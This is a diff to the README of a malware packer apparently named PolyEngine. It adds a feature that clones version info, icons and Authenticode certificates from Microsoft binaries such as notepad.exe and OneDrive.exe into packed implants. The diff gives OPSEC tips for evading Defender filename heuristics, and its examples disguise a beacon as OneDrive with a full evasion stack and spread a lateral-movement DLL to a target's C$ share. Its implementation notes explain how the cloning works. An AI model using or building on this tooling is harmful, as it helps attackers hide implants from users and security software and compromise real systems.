@@ -72,13 +72,20 @@ Evasion  (all ON by default):
     files       Recent-files count check (< 5 RecentDocs subkeys)
     all         Disable every token listed above
 
-Authenticode signing  (via mssign32!SignerSignEx2, no signtool dependency):
+Identity spoofing:
   --pfx <path>               PFX certificate container to sign the output with
   --pfx-pass <password>      PFX passphrase  [omit if PFX has no password]
   --ts-url <url>             RFC 3161 timestamp URL  [default: no timestamping]
                              OPSEC: timestamping reveals build IP/time to the TSA.
                              Enable only when signing from an isolated VM, or when
                              the signature must survive cert revocation.
+  --clone-meta <donor.exe>   Clone VERSIONINFO, icon, and Authenticode cert directory
+                             from a donor PE (e.g. notepad.exe, OneDrive.exe).
+                             Explorer "Details" tab shows donor company/product/version;
+                             file icon matches donor; "Digital Signatures" tab shows
+                             donor's signer (HashMismatch — defeats visual inspection only).
+                             Name output to match donor OriginalFilename field.
+                             When combined with --pfx: real signature overwrites cloned cert.
 
 Examples:
   Builder.exe implant.exe     packed.exe
@@ -90,6 +97,8 @@ Examples:
   Builder.exe implant.exe     packed.exe --exec-ctrl-name MyMutex --sleep-fwd-ms 1000
   Builder.exe implant.exe     packed.exe --pfx cert.pfx --pfx-pass hunter2
   Builder.exe implant.exe     packed.exe --pfx cert.pfx --ts-url http://timestamp.digicert.com
+  Builder.exe implant.exe     notepad.exe --clone-meta C:\Windows\System32\notepad.exe
+  Builder.exe implant.exe     notepad.exe --clone-meta notepad.exe --pfx self.pfx
 ```
 
 ---
@@ -259,6 +268,45 @@ Builder.exe implant.exe packed.exe --disable peb,spoofing
 </details>
 
 <details>
+<summary><b>Identity cloning — VERSIONINFO, icon, Authenticode cert</b></summary>
+
+Copy the cosmetic identity of any donor PE into the packed output. The output binary's Explorer properties, taskbar icon, and Digital Signatures tab all reflect the donor:
+
+```
+Builder.exe implant.exe notepad.exe --clone-meta C:\Windows\System32\notepad.exe
+Builder.exe implant.exe OneDrive.exe --clone-meta "C:\Program Files\Microsoft OneDrive\OneDrive.exe"
+```
+
+What gets cloned:
+- **VERSIONINFO** (`RT_VERSION`) — Explorer "Properties → Details" tab: company, product name, file version, copyright. All language IDs present in the donor are copied.
+- **Icon** (`RT_GROUP_ICON` + `RT_ICON`) — the lowest-ID icon group (the one Explorer uses for the shell icon). Taskbar, alt-tab, and file browser all show the donor's icon.
+- **Authenticode cert directory** — the raw `WIN_CERTIFICATE` PKCS#7 blob is appended at 8-byte-aligned EOF. Explorer "Properties → Digital Signatures" shows the donor's signer (e.g. `Microsoft Windows`). `Get-AuthenticodeSignature` returns `Status = HashMismatch` — the signature is structurally valid but the hash covers the donor's bytes, not ours. Defeats casual visual inspection; any real verifier (`signtool verify`, `WinVerifyTrust`, AV engines) detects the mismatch.
+
+**OPSEC — OriginalFilename:** the donor's VERSIONINFO embeds `OriginalFilename` (e.g. `notepad.exe`). Some signature checkers and Defender heuristics flag a mismatch between `OriginalFilename` and the actual file name on disk. Name the output to match:
+```
+Builder.exe implant.exe notepad.exe --clone-meta notepad.exe
+```
+
+**Combination with `--pfx`:** when both flags are present, Phase 11 (clone) runs before Phase 12 (sign). The real signature overwrites the cloned cert directory; VERSIONINFO and icon are preserved. `Get-AuthenticodeSignature` shows your certificate as valid, not the donor's hash-mismatched cert:
+```
+Builder.exe implant.exe notepad.exe --clone-meta notepad.exe --pfx self.pfx --pfx-pass hunter2
+```
+
+**Verification:**
+```powershell
+# Fake cert clone (no --pfx): expect HashMismatch, donor signer
+Get-AuthenticodeSignature .\notepad.exe | Format-List *
+
+# Real signature (--pfx): expect Valid, your cert
+Get-AuthenticodeSignature .\notepad.exe | Format-List *
+
+# signtool independent check
+signtool verify /pa /v notepad.exe
+```
+
+</details>
+
+<details>
 <summary><b>Authenticode signing (PFX, no signtool)</b></summary>
 
 Sign the packed output with a PFX certificate. Builder talks to `mssign32!SignerSignEx2` directly — no `signtool.exe` on the operator workstation, no Windows SDK signing tool required:
@@ -307,6 +355,16 @@ Builder.exe stage2.exe packed.exe --disable all --disable tls,debugger
 Lateral-movement helper DLL with a path argument:
 ```
 Builder.exe lateral.dll packed.exe --export Spread --arg "\\\\TARGET\\C$\\Users\\Public\\" --keep-alive --unhook
+```
+
+Long-term implant disguised as a common Microsoft binary, full evasion stack:
+```
+Builder.exe beacon.exe OneDrive.exe --clone-meta "C:\Program Files\Microsoft OneDrive\OneDrive.exe" --keep-alive --preset NETWORK --uptime-min 10
+```
+
+Packed sample with a real self-signed cert + matching VERSIONINFO identity:
+```
+Builder.exe implant.exe notepad.exe --clone-meta notepad.exe --pfx lab.pfx --pfx-pass test
 ```
 
 </details>
@@ -554,6 +612,17 @@ All Windows API names are replaced at compile time with precomputed Djb2 hashes 
 </details>
 
 <details>
+<summary><b>Identity cloning — <code>--clone-meta</code></b></summary>
+
+Optional Phase 11 post-build step that copies three cosmetic attributes from a donor PE into the already-built output. Runs after `BuildInfectedPE` (which rewrites `.rsrc` entirely — anything written earlier would be lost) and before `SignPeWithPfx` (which overwrites the cert directory with a real signature if `--pfx` is also given).
+
+**`CloneMeta_CopyResources`** loads the donor as a flat data file (`LOAD_LIBRARY_AS_DATAFILE` — deliberately *without* `LOAD_LIBRARY_AS_IMAGE_RESOURCE`, which activates MUI resource redirection on system files and routes `RT_GROUP_ICON` lookups to a language satellite `.mui` that contains no icons). `RT_VERSION` is enumerated via `EnumResourceLanguagesA` to collect all language IDs; each variant is written with `UpdateResourceA`. For `RT_GROUP_ICON`, the lowest integer-ID group is selected (the one Explorer uses for the shell icon by convention). `FindResourceA` is not used for the actual data lookup — it fails with `ERROR_RESOURCE_NAME_NOT_FOUND` (1813) on `LOAD_LIBRARY_AS_DATAFILE` handles even for resources that `EnumResourceNamesA` just found, because the `LANG_NEUTRAL` fallback path is broken in datafile mode. Instead, `EnumResourceLanguagesA` extracts the exact `LANGID` stored in the donor, then `FindResourceExA` uses it directly. All `UpdateResourceA` calls open the output PE with `BeginUpdateResourceA(FALSE)` — the merge flag preserves the existing `.rsrc` payload entry from Phase 10.
+
+**`CloneMeta_CopyCertDirectory`** reads the donor into a flat buffer via `ReadFileToBuffer`, parses the DOS → NT headers (supporting both x86 and x64 donors via `OptionalHeader.Magic` dispatch), and extracts `DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]`. That directory entry uses a **file offset** (not an RVA) — it is the only PE data directory where `VirtualAddress` is a raw byte offset into the file. The cert blob is appended at 8-byte-aligned EOF (WIN_CERTIFICATE alignment requirement), the target's SECURITY directory entry is patched in-place, then `MapFileAndCheckSumA` (from `imagehlp.lib`) recomputes the PE checksum. The write handle is **closed before calling `MapFileAndCheckSumA`** — `MapFileAndCheckSumA` opens its own internal handle and would fail with a sharing violation if the caller holds an exclusive write handle — then re-opened briefly to write just the 4-byte checksum at the computed file offset.
+
+</details>
+
+<details>
 <summary><b>Authenticode signing — <code>--pfx</code></b></summary>
 
 Optional post-build step. When `--pfx` is supplied, Builder signs the packed output via `mssign32!SignerSignEx2` (resolved at runtime — no link-time `mssign32` dependency, no `signtool.exe` on the operator workstation). Signing runs as Phase 9 after `BuildInfectedPE` returns, because writing the signature rewrites `IMAGE_DIRECTORY_ENTRY_SECURITY` and recalculates the PE checksum; any later resource edit would invalidate the signature.
@@ -637,6 +706,7 @@ Index 9 (`bcrypt.dll`) is reachable only via `--preset RANDOM`; the named preset
 PolyEngine/
 ├── Builder/
 │   ├── Builder.cpp          — CLI parser, orchestration, CryptGenRandom salt/indices
+│   ├── CloneMeta.cpp/h      — PE identity cloning: VERSIONINFO + icon + cert directory (--clone-meta)
 │   └── PeSigning.cpp/h      — optional Authenticode signing via mssign32!SignerSignEx2 (--pfx)
 ├── Engine/                  — shared between Builder and Stub (compiled into both)
 │   ├── Compression.c/h      — LZNT1 compress (Builder) / decompress (Stub) wrappers
